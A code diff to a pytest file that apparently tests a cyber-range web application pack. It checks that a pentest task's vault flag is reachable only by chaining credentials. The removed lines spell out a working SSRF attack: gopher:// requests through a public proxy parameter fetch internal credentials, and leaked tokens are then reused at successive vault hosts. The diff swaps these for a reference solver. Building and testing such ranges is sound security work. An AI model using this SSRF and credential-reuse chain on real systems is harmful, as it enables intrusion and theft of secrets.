@@ -7,7 +7,6 @@ containers."""
 
 from __future__ import annotations
 
-import json
 import shutil
 import subprocess
 import urllib.error
@@ -17,6 +16,7 @@ from pathlib import Path
 
 import pytest
 from cyber_webapp import NetworkedContainerWebappRuntime, WebappPack, _is_networked
+from cyber_webapp.reference_solver import solve_chain
 from graphschema import WorldGraph
 from openrange_pack_sdk import Backing, Snapshot
 
@@ -48,70 +48,12 @@ def _chain_depth(graph: WorldGraph) -> int:
     )
 
 
-def _ssrf_entry(graph: WorldGraph) -> tuple[str, str]:
-    # The public proxy-SSRF endpoint + its target param — the agent's only entry.
-    ssrf = next(
-        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
-    )
-    public_eps = {
-        e.dst
-        for svc in graph.by_kind("service")
-        if svc.attrs.get("exposure") == "public"
-        for e in graph.out_edges(svc.id, "exposes")
-    }
-    ep = next(iter({e.dst for e in graph.out_edges(ssrf.id, "affects")} & public_eps))
-    return str(graph.nodes[ep].attrs["public_url"]), str(
-        ssrf.attrs["params"]["target_param"]
-    )
-
-
-def _entry_host(graph: WorldGraph) -> str:
-    leak_ep = next(n for n in graph.by_kind("endpoint") if n.id.endswith("_credleak"))
-    svc = next(
-        e.src
-        for e in graph.edges.values()
-        if e.kind == "exposes" and e.dst == leak_ep.id
-    )
-    return str(graph.nodes[svc].attrs["name"])
-
-
-def _get(base: str, path: str, query: dict[str, str] | None = None) -> str:
-    url = f"{base}{path}"
-    if query:
-        url += "?" + urllib.parse.urlencode(query)
+def _get(base: str, path: str) -> str:
     try:
-        with urllib.request.urlopen(url, timeout=15) as resp:
+        with urllib.request.urlopen(f"{base}{path}", timeout=15) as resp:
             return str(resp.read().decode())
     except urllib.error.HTTPError as exc:
         return exc.read().decode()
-
-
-def _follow_chain(
-    base: str, ssrf_url: str, param: str, entry: str
-) -> dict[str, str | list[str]]:
-    # Drive the chain the way an agent would: SSRF to the entry host, then keep reusing
-    # each handed-over credential at the next host until one returns the flag. Records
-    # the entry body, the terminal body, and a no-credential probe at every gated hop.
-    entry_body = _get(base, ssrf_url, {param: f"gopher://{entry}/internal/credentials"})
-    cfg = json.loads(entry_body)
-    no_cred_bodies: list[str] = []
-    terminal_body = entry_body
-    while "vault_host" in cfg:
-        host, vpath = cfg["vault_host"], cfg["vault_path"]
-        aparam, token = cfg["auth_param"], cfg["db_token"]
-        no_cred_bodies.append(_get(base, ssrf_url, {param: f"gopher://{host}{vpath}"}))
-        terminal_body = _get(
-            base, ssrf_url, {param: f"gopher://{host}{vpath}?{aparam}={token}"}
-        )
-        try:
-            cfg = json.loads(terminal_body)
-        except json.JSONDecodeError:
-            cfg = {}
-    return {
-        "entry": entry_body,
-        "terminal": terminal_body,
-        "no_cred": no_cred_bodies,
-    }
 
 
 def _enables_chain_kinds(graph: WorldGraph) -> list[str]:
@@ -188,22 +130,15 @@ def test_lateral_solves_on_process(tmp_path: Path) -> None:
     snap = _admit()
     graph = snap.graph
     flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
-    ssrf_url, param = _ssrf_entry(graph)
-    entry = _entry_host(graph)
 
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
     svc = EpisodeService(WebappPack(), tmp_path)
     try:
         handle = svc.start_episode(snap, pentest.id)
         base = str(svc.surface(handle)["base_url"])
-        out = _follow_chain(base, ssrf_url, param, entry)
-        assert flag not in out["entry"]  # the entry leaks a credential, never the flag
-        assert all(
-            flag not in b for b in out["no_cred"]
-        )  # every gate denies w/o the key
-        assert (
-            flag in out["terminal"]
-        )  # reusing the chain of credentials opens the vault
+        trace = solve_chain(graph, lambda p: _get(base, p))
+        assert flag in trace.terminal  # reusing the credential chain opens the vault
+        assert all(flag not in probe for probe in trace.probes)  # gates deny w/o a key
     finally:
         svc.close()
 
@@ -231,20 +166,17 @@ def test_lateral_solves_across_real_containers() -> None:
     snap = _admit()
     graph = snap.graph
     flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
-    ssrf_url, param = _ssrf_entry(graph)
-    entry = _entry_host(graph)
 
     runtime = WebappPack().realize(graph, Backing.CONTAINER)
     assert isinstance(runtime, NetworkedContainerWebappRuntime)
     try:
         runtime.reset()
         base = str(runtime.surface()["base_url"])
-        out = _follow_chain(base, ssrf_url, param, entry)
-        assert flag not in out["entry"]
-        assert all(flag not in b for b in out["no_cred"])
+        trace = solve_chain(graph, lambda p: _get(base, p))
         assert (
-            flag in out["terminal"]
+            flag in trace.terminal
         )  # recovered across containers via credential reuse
+        assert all(flag not in probe for probe in trace.probes)
         assert "secret_flag" in runtime.collect()["leaked_secret_ids"]
     finally:
         runtime.stop()
